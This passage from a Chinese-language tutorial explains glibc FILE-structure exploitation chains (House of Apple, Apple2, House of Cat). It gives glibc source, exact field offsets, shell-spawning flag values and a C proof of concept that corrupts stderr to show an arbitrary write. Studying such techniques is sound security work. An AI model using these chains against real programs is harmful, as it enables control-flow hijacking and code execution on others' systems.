相关定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br></pre></td></tr></table></figure></div> 因此只要控制了 <code>_wide_data</code>
指针就能完成任意地址写。其中需要绕过如下判断： - 为了能够进入
<code>_IO_wstrn_overflow</code> 函数的 if 判断中，需要满足
<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>
。 - 为了避免执行 <code>free (f-&gt;_wide_data-&gt;_IO_buf_base);</code>
需要满足 <code>f-&gt;_wide_data-&gt;_IO_buf_base</code> 为空或者
<code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code> 不为 0 ，其中
<code>_IO_FLAGS2_USER_WBUF</code> 为 8 。 - 另外如果利用 FSOP
触发需要满足： - <code>fp-&gt;_mode &lt;= 0</code> -
<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/28394641dc65ceca722b37cef61c2d15.png"
                     
alt="在这里插入图片描述" 
                > <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_apple" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate a 0x100 chunk&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    <span class="type">size_t</span> *tmp = p1;</span><br><span class="line">    <span class="type">size_t</span> old_value = <span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        p1[i] = old_value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================old value=======================&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *) puts_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_write_ptr_addr = libc_base + <span class="number">0x3b8608</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_IO_write_ptr address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_write_ptr_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_flags2_addr = libc_base + <span class="number">0x3b8654</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_flags2 address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_flags2_addr);</span><br><span class="line">    <span class="type">size_t</span> stderr_wide_data_addr = libc_base + <span class="number">0x3b8680</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;_wide_data address: %p\n&quot;</span>, (<span class="type">void</span> *) stderr_wide_data_addr);</span><br><span class="line">    <span class="type">size_t</span> sdterr_vtable_addr = libc_base + <span class="number">0x3b86b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] stderr-&gt;vtable address: %p\n&quot;</span>, (<span class="type">void</span> *) sdterr_vtable_addr);</span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base + <span class="number">0x3b3c40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *) _IO_wstrn_jumps_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_IO_write_ptr to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_write_ptr_addr = (<span class="type">size_t</span>) <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_flags2 to 8&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_flags2_addr = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: replace stderr-&gt;_wide_data with the allocated chunk&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) stderr_wide_data_addr = (<span class="type">size_t</span>) p1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;vtable with _IO_wstrn_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *) sdterr_vtable_addr = (<span class="type">size_t</span>) _IO_wstrn_jumps_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: call fcloseall and trigger house of apple&quot;</span>);</span><br><span class="line">    fcloseall();</span><br><span class="line">    tmp = p1;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%p]: 0x%016lx  0x%016lx\n&quot;</span>, tmp, tmp[<span class="number">0</span>], tmp[<span class="number">1</span>]);</span><br><span class="line">        tmp += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## House of Apple2 | House of Cat
<code>_wide_data</code> 结构中有一个类似 <code>vtable</code> 的
<code>_wide_vtable</code> 指向 <code>_IO_jump_t</code> 结构。</p>
<p>与 <code>vtable</code> 相同，对 glibc 中也定义了调用
<code>_wide_vtable</code> 中函数的宏，其中在 glibc 中真正使用到的有
<code>_IO_WSETBUF</code>、<code>_IO_WUNDERFLOW</code>、<code>_IO_WDOALLOCATE</code>，但与
<code>vtable</code> 不同的是这三个宏均缺少对 <code>_wide_vtable</code>
位置的检查。</p>
<p>例如 <code>_IO_OVERFLOW</code> 的宏在调用 <code>__overflow</code>
函数之前调用了 <code>IO_validate_vtable</code> 检查 <code>vtable</code>
位置的合法性。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure></div>
<p>而 <code>_IO_WOVERFLOW</code> 没有检查。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure></div>
<p>因此可以通过修改 <code>vtable</code> 改变程序执行流程，使程序调用
<code>_wide_vtable</code> 中的函数，然后再将 <code>_wide_vtable</code>
指向一个伪造的函数表从而劫持程序执行流程。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/214fa556139c2a5b9595aa209bbff5df.png"
                     
alt="在这里插入图片描述" 
                > 具体利用方式有以下几种： ###
利用_IO_wfile_overflow函数控制程序执行流</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>;sh;</code>
。</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下： 首先看<code>_IO_wfile_overflow</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wdoallocbuf (f);<span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p>
<p>然后看<code>_IO_wdoallocbuf</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)<span class="comment">// _IO_WXXXX调用</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure></div>
<p>需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base == 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p>
<h3
id="利用_io_wfile_underflow_mmap函数控制程序执行流">利用_IO_wfile_underflow_mmap函数控制程序执行流</h3>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>sh;</code>，注意前面有个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下： 看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p>
<h3
id="利用_io_wdefault_xsgetn函数控制程序执行流">利用_IO_wdefault_xsgetn函数控制程序执行流</h3>
<p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong>。如果不满足这个条件，可选用其他链。</p>
<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>0x800</code></li>
<li><code>vtable</code>设置为<code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wdefault_xsgetn</code>即可</li>
<li><code>_mode</code>设置为大于<code>0</code>，即满足<code>*(fp + 0xc0) &gt; 0</code></li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code>设置为<code>0</code>，即满足<code>*(A + 8) = *A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt; *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure></div>
<p>详细分析如下： 首先看<code>_IO_wdefault_xsgetn</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">          <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">          <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">        *s++ = *p++;</span><br><span class="line">          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdefault_xsgetn)</span><br></pre></td></tr></table></figure></div>
<p>由于<code>more</code>是第三个参数，所以不能为<code>0</code>。
直接设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end</code>，使得<code>count</code>为<code>0</code>，不进入<code>if</code>分支。
随后当<code>more != 0</code>时会进入<code>__wunderflow</code>。</p>
<p>接着看<code>__wunderflow</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p>
<p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时就会调用<code>_IO_WOVERFLOW(fp)</code>。
### 利用_IO_wfile_seekoff函数控制程序执行流（House of Cat）</p>
<p>对 <code>fp</code> 的设置如下：</p>
<ul>
<li><p><code>_flags</code> 设置为 <code>~0x8</code>，如果不能保证
<code>_lock</code> 指向可读写内存则
<code>_flags |= 0x8000</code>。</p></li>
<li><p><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_seekoff</code>即可</p></li>
<li><p><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></p></li>
<li><p><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>
，即满足<code>*A &gt; *(A + 8)</code></p></li>
<li><p><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></p></li>
<li><p><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x18) = C</code></p></li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff</span><br><span class="line">    _IO_switch_to_wget_mode</span><br><span class="line">        _IO_WOVERFLOW</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure></div>
